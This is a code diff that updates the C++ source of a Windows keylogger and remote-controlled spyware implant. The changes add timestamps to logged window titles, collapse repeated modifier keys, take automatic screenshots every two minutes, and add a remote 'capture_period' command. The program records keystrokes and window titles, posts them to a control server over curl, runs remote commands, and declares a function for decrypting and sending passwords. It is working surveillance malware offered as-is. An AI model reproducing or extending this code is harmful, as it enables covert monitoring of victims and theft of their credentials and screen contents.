@@ -28,8 +28,10 @@
 using namespace std;
 namespace fs = experimental::filesystem;
 // Global Variable
-int UPDATE_PERIOD = 1000;
-char CAPTURE_PERIOD = 1;
+
+
+int UPDATE_PERIOD = 1000; // 10s
+char CAPTURE_PERIOD = 12; // 12*10s = 2m
 char capture_count = 0;
 
 // FUNCTION
@@ -41,6 +43,7 @@ void decrypt_send_password(string url);
 string get_list_files(string dir);
 wstring get_list_files(wstring dir);
 wstring get_path_w(string dir);
+string get_current_time();
 int execute_command(string cmd);
 // char * ReadAllBytes(const char * filename, int * read_length);
 
@@ -87,6 +90,7 @@ int main()
 	
 	string key_data = "";
 	string cmd = "";
+	int last_key = 0;
 
 	int count = 0;
 	
@@ -111,7 +115,15 @@ int main()
 				std::printf("NO DATA TO SEND\n");
 #endif
 			}
+
 			execute_command(cmd);
+
+			// capture screenshot after 2m
+			capture_count++;
+			if (capture_count >= CAPTURE_PERIOD && cmd.compare("screenshot") != 0) {
+				capture_count = 0;
+				execute_command("screenshot");
+			}
 		}
 
 		HWND hwndHandle = GetForegroundWindow();
@@ -133,7 +145,7 @@ int main()
 				/* Send data to server */
 				string send_title = get_utf8(title);
 				send_title[send_title.length() - 1] = ' ';
-				send_title = "</div>\n<div class='title'>" + send_title + "</div>\n<div class='key'>";
+				send_title = "</div>\n<div class='title'>" + get_current_time() + send_title + "</div>\n<div class='key'>";
 				key_data = key_data + send_title;
 				/* clear title */
 				send_title = "";
@@ -149,13 +161,8 @@ int main()
 		{
 			if (GetAsyncKeyState(KEY) == -32767) {
 				string out = "";
-				if (KEY == 1)
-					out = "[LMOUSE]"; // Mouse Left
-				else if (KEY == 2)
-					out = "[RMOUSE]"; // Mouse Right
-				else if (KEY == 4)
-					out = "[MMOUSE]"; // Mouse Middle
-				else if (KEY == 46)
+				
+				if (KEY == 46)
 					out = "[DEL]";
 				else if (KEY >= 48 && KEY <= 57) {  // number 0-9
 					if (GetAsyncKeyState(VK_SHIFT)) {
@@ -185,20 +192,36 @@ int main()
 				}
 				else if (KEY == 13)
 					out = "[RETURN]";
-				else if (KEY == 16 || KEY == 17 || KEY == 18)
-					out = "";
-				else if (KEY == 160 || KEY == 161) // lastc == 16
+				else if (KEY == 16 || KEY == 160 || KEY == 161) { // SHIFT
+					if (last_key == 16 || last_key == 160 || last_key == 161) {
+						// if last key is also SHIFT -> skip
+						last_key = KEY;
+						continue;
+					}
 					out = "[SHIFT]";
-				else if (KEY == 162 || KEY == 163) // lastc == 17
+				}
+				else if (KEY == 17 || KEY == 162 || KEY == 163) { // CTRL
+					if (last_key == 17 || last_key == 162 || last_key == 163) {
+						// if last key is also CTRL -> skip
+						last_key = KEY;
+						continue;
+					}
 					out = "[CTRL]";
-				else if (KEY == 164) // lastc == 18
+				}
+				else if (KEY == 18 || KEY == 164 || KEY == 165) {  // ALT
+					if (last_key == 18 || last_key == 164 || last_key == 165) {
+						// if last key is also ALT -> skip
+						last_key = KEY;
+						continue;
+					}
 					out = "[ALT]";
-				else if (KEY == 165)
-					out = "[ALT GR]";
+				}
 				else if (KEY == 8)
 					out = "[BACKSPACE]";
 				else if (KEY == 9)
 					out = "[TAB]";
+				else if (KEY == 20)
+					out = "[Caps lock]";
 				else if (KEY == 27)
 					out = "[ESC]";
 				else if (KEY == 33)
@@ -210,30 +233,30 @@ int main()
 				else if (KEY == 36)
 					out = "[POS1]";
 				else if (KEY == 37)
-					out = "[ARROW LEFT]";
+					out = "[LEFT]";
 				else if (KEY == 38)
-					out = "[ARROW UP]";
+					out = "[UP]";
 				else if (KEY == 39)
-					out = "[ARROW RIGHT]";
+					out = "[RIGHT]";
 				else if (KEY == 40)
-					out = "[ARROW DOWN]";
+					out = "[DOWN]";
 				else if (KEY == 45)
 					out = "[INS]";
 				else if (KEY == 91 || KEY == 92)
 					out = "[WIN]";
-				else if (KEY >= 96 && KEY <= 105) {
-					out = "[NUM ";
-					out = out + char(KEY - 96);
+				else if (KEY >= 96 && KEY <= 105) { // number 0-9
+					out = "[";
+					out = out + to_string(KEY - 96);
 					out = out + "]";
 				}
 				else if (KEY == 106)
-					out = "[NUM /]";
+					out = "[/]";
 				else if (KEY == 107)
-					out = "[NUM +]";
+					out = "[+]";
 				else if (KEY == 109)
-					out = "[NUM -]";
+					out = "[-]";
 				else if (KEY == 109)
-					out = "[NUM ,]";
+					out = "[,]";
 				else if (KEY >= 112 && KEY <= 123)
 				{
 					out = "[F";
@@ -268,9 +291,11 @@ int main()
 				}
 #ifdef CONSOLE_LOG
 				LPSTR s = const_cast<char *>(out.c_str());
-				std::wcout << s;
+				// std::wcout << s;
+				std::wcout << to_wstring(KEY);
 #endif
 				/* append data to buffer */
+				last_key = KEY;
 				key_data = key_data + out;
 			}
 		}
@@ -278,6 +303,18 @@ int main()
 	// Cleanup CURL
 	curl_global_cleanup();
     return 0;
+}
+
+string get_current_time() {
+	time_t rawtime;
+	time(&rawtime);
+
+	struct tm *tm_struct = localtime(&rawtime);
+
+	int hour = tm_struct->tm_hour;
+	int min = tm_struct->tm_min;
+	string res = "[" + to_string(hour) + ":" + to_string(min) + "]  ";
+	return res;
 }
 
 int execute_command(string cmd) {
@@ -369,12 +406,6 @@ int execute_command(string cmd) {
 
 	// Screenshot
 	if (cmd.compare("screenshot")==0) {
-		capture_count++;
-		if (capture_count >= CAPTURE_PERIOD) {
-			capture_count = 0;
-			return 0;
-		}
-
 		WCHAR temp_path[MAX_PATH];
 		get_temp_path(temp_path, MAX_PATH, _T("tmp.png"));
 		HRESULT res = CaptureScreen(temp_path);
@@ -409,13 +440,38 @@ int execute_command(string cmd) {
 		string period = cmd.substr(offset, cmd.length() - 3);
 		int time = atoi(period.c_str());
 		time = time / 10;
-		if (time<300)
+		if (time<400)
 		{
-			time = 300;
+			time = 400;
 		}
 		UPDATE_PERIOD = time;
 		// ascii dir
 		curl_post("Update period (ms) = " + to_string(UPDATE_PERIOD*10), URL_CMD);
+		return 0;
+	}
+
+	// CMD change UPDATE_PERIOD
+	if (cmd.find("capture_period ", 0) != std::string::npos) {
+		// remove space
+		int offset = 14;
+		while (offset < (cmd.length() - 1)) {
+			if (cmd[offset] == ' ') {
+				offset++;
+			}
+			else {
+				break;
+			}
+		}
+		// actual period
+		string period = cmd.substr(offset, cmd.length() - 3);
+		int value = atoi(period.c_str());
+		if (value < 1) {
+			value = 1;
+		}
+
+		CAPTURE_PERIOD = value;
+		// ascii dir
+		curl_post("Update capture screen period = " + to_string(CAPTURE_PERIOD) +" x " + to_string(UPDATE_PERIOD * 10), URL_CMD);
 		return 0;
 	}
 
